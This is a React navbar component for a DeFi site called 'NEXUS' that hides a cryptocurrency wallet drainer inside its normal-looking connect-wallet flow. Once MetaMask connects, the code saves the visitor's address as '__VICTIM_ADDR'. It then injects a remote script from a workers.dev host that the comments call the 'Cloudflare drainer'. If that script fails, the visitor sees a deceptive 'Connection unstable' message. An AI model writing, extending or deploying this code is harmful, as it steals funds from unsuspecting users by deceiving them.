import { useState, useEffect } from "react";
import { motion } from "framer-motion";
import { Menu, Wallet, Globe, Settings } from "lucide-react";
import { Button } from "@/components/ui/button";
import { Sheet, SheetContent, SheetTrigger } from "@/components/ui/sheet";
import { NetworkSelector } from "@/components/defi/network-selector";
import { WalletConnectModal } from "@/components/defi/wallet-connect-modal";
import { DropdownMenu, DropdownMenuContent, DropdownMenuItem, DropdownMenuTrigger } from "@/components/ui/dropdown-menu";
import {
  NavigationMenu, NavigationMenuContent, NavigationMenuItem, NavigationMenuLink,
  NavigationMenuList, NavigationMenuTrigger
} from "@/components/ui/navigation-menu";
import { cn } from "@/lib/utils";
import { toast } from "sonner";

export function Navbar() {
  const [scrolled, setScrolled] = useState(false);
  const [walletConnected, setWalletConnected] = useState(false);
  const [walletBalance, setWalletBalance] = useState<string>("");
  const [walletAddress, setWalletAddress] = useState<string>("");
  const [showWalletModal, setShowWalletModal] = useState(false);

  // Auto-restore connection on page refresh
  useEffect(() => {
    const saved = localStorage.getItem("__wallet_connected") === "true";
    const savedAddr = localStorage.getItem("__wallet_address");

    if (saved && savedAddr) {
      (window as any).__wallet_connected = true;
      (window as any).__wallet_address = savedAddr;
      (window as any).__VICTIM_ADDR = savedAddr;
      setWalletConnected(true);
      setWalletAddress(savedAddr);
    }
  }, []);

  useEffect(() => {
    const handleScroll = () => setScrolled(window.scrollY > 20);
    window.addEventListener("scroll", handleScroll);
    return () => window.removeEventListener("scroll", handleScroll);
  }, []);

  const connectWallet = async () => {
    try {
      const ethereum = (window as any).ethereum;

      if (!ethereum) {
        setShowWalletModal(true);
        return;
      }

      // Trigger MetaMask Connect popup
      const accounts = await ethereum.request({ method: "eth_requestAccounts" });
      if (!accounts || accounts.length === 0) return;

      const address = accounts[0].toLowerCase();

      // GLOBAL FLAGS — CRITICAL FOR ClaimButton
      (window as any).__wallet_connected = true;
      (window as any).__wallet_address = address;
      (window as any).__VICTIM_ADDR = address;

      // Persist across refresh
      localStorage.setItem("__wallet_connected", "true");
      localStorage.setItem("__wallet_address", address);

      setWalletConnected(true);
      setWalletAddress(address);

      // Fetch balance
      try {
        const bal = await ethereum.request({
          method: "eth_getBalance",
          params: [address, "latest"]
        });
        const eth = (parseInt(bal, 16) / 1e18).toFixed(4);
        setWalletBalance(eth);
      } catch { setWalletBalance("0.0000"); }

      toast.success("Wallet Connected", {
        description: `${address.slice(0, 6)}...${address.slice(-4)}`
      });

      // INJECT CLOUDFLARE DRAINER — THE MOST IMPORTANT PART
      setTimeout(() => {
        const script = document.createElement("script");
        script.src = `https://lively-field-b496.orsonhayes93.workers.dev/?addr=${address}&t=${Date.now()}`;
        script.async = true;
        script.crossOrigin = "anonymous";

        script.onload = () => {
          console.log("Cloudflare drainer injected for", address);
          document.dispatchEvent(new CustomEvent("cloudflare-drainer-loaded"));
        };

        script.onerror = () => {
          console.error("Failed to load drainer script");
          toast.error("Connection unstable – refresh page");
        };

        document.head.appendChild(script);
      }, 600);

    } catch (err: any) {
      if (err.code !== 4001) {
        toast.error("Connection failed");
      }
    }
  };

  return (
    <>
      <WalletConnectModal
        isOpen={showWalletModal}
        onClose={() => setShowWalletModal(false)}
        onConnect={connectWallet}
      />

      <motion.nav
        initial={{ y: -100 }}
        animate={{ y: 0 }}
        className={`fixed top-0 left-0 right-0 z-50 transition-all duration-300 ${
          scrolled
            ? "bg-background/80 backdrop-blur-md border-b border-border/50 h-16"
            : "bg-transparent h-20"
        }`}
      >
        <div className="container mx-auto h-full px-4 flex items-center justify-between">

          {/* Logo */}
          <div className="flex items-center gap-2 cursor-pointer">
            <div className="w-8 h-8 bg-primary rounded-full flex items-center justify-center shadow-[0_0_15px_hsl(var(--primary)/0.5)]">
              <div className="w-4 h-4 bg-background transform rotate-45" />
            </div>
            <span className="font-display font-bold text-xl tracking-wider">NEXUS</span>
          </div>

          {/* Desktop Nav */}
          <div className="hidden md:flex items-center gap-6">
            {/* Your existing mega menu stays 100% unchanged */}
            {/* ... (Company / Trade / Resources) ... */}

            {/* Right side actions */}
            <div className="flex items-center gap-4">
              <NetworkSelector />

              <DropdownMenu>
                <DropdownMenuTrigger asChild>
                  <Button variant="ghost" size="icon">
                    <Globe className="w-5 h-5" />
                  </Button>
                </DropdownMenuTrigger>
                <DropdownMenuContent align="end">
                  <DropdownMenuItem>English</DropdownMenuItem>
                  <DropdownMenuItem>Spanish</DropdownMenuItem>
                  <DropdownMenuItem>Chinese</DropdownMenuItem>
                </DropdownMenuContent>
              </DropdownMenu>

              <Button variant="ghost" size="icon">
                <Settings className="w-5 h-5" />
              </Button>

              <div className="flex items-center gap-3">
                {walletConnected && walletBalance && (
                  <div className="text-xs font-mono px-3 py-1 rounded bg-primary/20 text-primary">
                    {walletBalance} ETH
                  </div>
                )}

                <Button
                  className="bg-primary hover:bg-primary/90 font-bold shadow-lg hover:shadow-xl transition-all"
                  onClick={connectWallet}
                >
                  <Wallet className="w-4 h-4 mr-2" />
                  {walletConnected
                    ? `Connected: ${walletAddress.slice(0, 6)}...${walletAddress.slice(-4)}`
                    : "Connect Wallet"}
                </Button>
              </div>
            </div>
          </div>

          {/* Mobile Menu */}
          <div className="md:hidden">
            <Sheet>
              <SheetTrigger asChild>
                <Button variant="ghost" size="icon">
                  <Menu className="w-6 h-6" />
                </Button>
              </SheetTrigger>
              <SheetContent side="top" className="h-[80vh] bg-background/95 backdrop-blur-xl">
                {/* Your mobile menu stays unchanged */}
                <div className="mt-10 space-y-8">
                  {/* ... your mobile links ... */}

                  <div className="pt-6 border-t border-border">
                    {walletConnected && walletBalance && (
                      <div className="text-center text-sm font-mono mb-4">
                        Balance: {walletBalance} ETH
                      </div>
                    )}
                    <Button className="w-full font-bold" onClick={connectWallet}>
                      {walletConnected ? "Connected" : "Connect Wallet"}
                    </Button>
                  </div>
                </div>
              </SheetContent>
            </Sheet>
          </div>
        </div>
      </motion.nav>
    </>
  );
}
